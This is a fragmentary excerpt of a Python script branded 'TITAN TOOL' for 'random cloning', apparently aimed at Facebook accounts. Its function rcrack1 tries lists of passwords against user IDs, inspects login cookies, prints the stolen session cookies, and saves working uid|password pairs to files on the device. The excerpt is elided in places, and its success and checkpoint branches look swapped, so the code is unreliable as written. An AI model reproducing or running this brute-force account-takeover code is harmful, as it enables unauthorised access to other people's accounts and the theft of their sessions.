...
| $$\  $ | $$| $$  \ $$      | $$  | $$| $$  | $$| $$ | $$ | $$| $$_____/| $$      
| $$ \/  | $$| $$  | $$      |  $$$$$$/|  $$$$$$/|  $$$$$/$$$$/|  $$$$$$$| $$      
|__/     |__/|__/  |__/       \______/  \______/  \_____/\___/  \_______/|__/      
                                                                                   
                                                                                   
                                                                                   
                                                                                                                    
       \33[37;42m\t 𝘞𝘌𝘓𝘊𝘖M𝘌 TITAN 𝘛𝘖𝘖𝘓➢V=1.0\33[0;m                
   \033[1;96m  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    \033[0;91m ┃  𝙉𝘼𝙈𝙀        : [✘] 𝐌𝐑 𝐉𝐮𝐰𝐞𝐥     ┃
    \033[1;92m ┃  𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    : [✘] 𝐌𝐑 𝐉𝐮𝐰𝐞𝐥     ┃
    \033[0;91m ┃  𝙂𝙄𝙏𝙃𝙐𝘽      : [✘] 𝐌𝐑 𝐉𝐮𝐰𝐞𝐥  ┃
   \033[1;92m  ┃  𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀  : \033[1;96m[✘] RANDOM CLONING  ┃
     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mTITAN\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" \n Cookie : {coki}")
                print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                open('/sdcard/TiTAN/cp.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[38;5;46m[ok] {cid}|{ps}")
                print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                open('/sdcard/TITAN-OK.txt', 'a').write( uid+' | '+ps+' \n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[TITAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()